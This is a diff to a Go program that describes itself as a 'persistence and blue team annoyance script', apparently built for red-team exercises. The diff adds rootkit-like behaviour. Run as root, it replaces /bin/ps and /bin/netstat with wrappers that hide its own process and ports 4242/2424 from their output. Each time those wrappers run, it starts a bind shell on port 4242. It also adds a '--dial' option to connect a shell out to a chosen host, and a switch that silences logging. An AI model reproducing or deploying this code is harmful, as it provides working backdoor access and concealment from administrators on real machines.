@@ -5,17 +5,24 @@
 // 30 March 2021
 //
 
+//
+// Do-it-all persistence and blue team annoyance script.
+//
+
 package main
 
 import (
 	"fmt"
 	"io"
+	"io/ioutil"
 	"log"
 	"net"
 	"os"
 	"os/exec"
+	"strconv"
 	"strings"
-	"sync"
+	/*"sync"*/
+	/*"syscall"*/
 )
 
 // Write a message to all pts sessions
@@ -55,13 +62,15 @@ func dial(host string, port int) {
 
 
 // bind listens on the specified tcp port and provides a shell
+// TODO: Use port 4242 for root shells, 4240 for non root.
 func bind(port int) {
 	// Start listening on the specified tcp port
 	l, e := net.Listen("tcp", fmt.Sprintf(":%d", port))
-	log.Printf("Listening on port %d...\n", port) 
 	if e != nil {
 		log.Fatal(e)
 	}
+	
+	log.Printf("Listening on port %d...\n", port) 
 	
 	// Close the listener when bind returns
 	defer l.Close()
@@ -89,6 +98,7 @@ func bind(port int) {
 		}
 		// Start a goroutine to handle any connections
 		go session(c)
+		ghostsay("That's interesting...")
 	}
 }
 
@@ -117,7 +127,7 @@ func possess() {
 		log.Fatal("possess requires root.")
 	}
 	ghostpath := "/bin/.gnughost"
-	targets := [1]string{"/bin/netstat"}
+	targets := [2]string{"/bin/ps", "/bin/netstat"}
 	//targets := [6]string{"/bin/ls","/bin/cp","/bin/apt","/bin/who", "/bin/netstat", "/bin/ps"}
 	
 	// Copy Ghost to ghostpath if not there already
@@ -139,7 +149,7 @@ func possess() {
 	
 	// Overwrite targets with mimic script
 	
-	mimic := fmt.Sprintf("#!/bin/bash\n%s --pretend $0 $@", ghostpath)
+	mimic := fmt.Sprintf("#!/bin/bash\n%s --nolog --pretend $0 $@", ghostpath)
 	
 	for _, target := range targets {
 		os.Remove(target)
@@ -159,9 +169,14 @@ func pretend(exe string, args []string) {
 	s := strings.Split(exe, "/")
 	exename := s[len(s)-1]
 	ghostexe := fmt.Sprintf("/bin/.ghost%s", exename)
-	raw, _ := exec.Command(ghostexe, args...).CombinedOutput()
+	log.Printf("pretend: Executing %s %v\n", ghostexe, args)
+	raw, e := exec.Command(ghostexe, args...).CombinedOutput()
+	if e != nil {
+		log.Print(e)
+	}
 	out := strings.Split(string(raw), "\n")
 	
+	// Patterns to filter out
 	patterns := [4]string{"ghost", string(os.Getpid()), "4242", "2424"}
 	for _, line := range out {
 		safe := true
@@ -177,32 +192,30 @@ func pretend(exe string, args []string) {
 	}
 }
 
+
 func main() {
-	/*
-	fmt.Printf("Hello from %d", os.Getpid())
-	fmt.Printf(" (ppid: %d, uid: %d)\n", os.Getppid(), os.Getuid())
-	fmt.Printf("argv: %v\n", os.Args)
-	*/
-	
-	if len(os.Args) == 1 {
-		return
-	}
-	
-	if os.Args[1] == "--pretend" {
-		pretend(os.Args[2], os.Args[3:])
-	} else if os.Args[1] == "--possess" {
-		possess()
-	} else if os.Args[1] == "--bind" {
-		var wait sync.WaitGroup
-		wait.Add(1)
-		go func () {
+	for i := 1; i < len(os.Args); i++ {
+		switch os.Args[i] {
+			case "--nolog": // --nolog
+			log.SetOutput(ioutil.Discard)
+			case "--possess": // --possess
+			possess()
+			case "--pretend": // --pretend <command> <args...>
+			pretend(os.Args[i+1], os.Args[i+2:])
+			cmd := exec.Command(os.Args[0], []string{"--bind"}...)
+			cmd.Start()
+			return
+			case "--dial": // --dial <host> <port>
+			port, _ := strconv.Atoi(os.Args[i+2])
+			dial(os.Args[i+1], port)
+			i += 2
+			case "--bind": // --bind
 			bind(4242)
-			wait.Done()
-		}()
-		// Do not exit unless goroutine has exited
-		wait.Wait()
+			case "--say": // --say <message>
+			ghostsay(os.Args[i+1])
+			i += 1
+			default:
+			log.Fatal("Unrecognized argument: ", os.Args[i])
+		}
 	}
-	
-	//ghostsay("\nHello\n")
-	//dial("", 2424)
 }
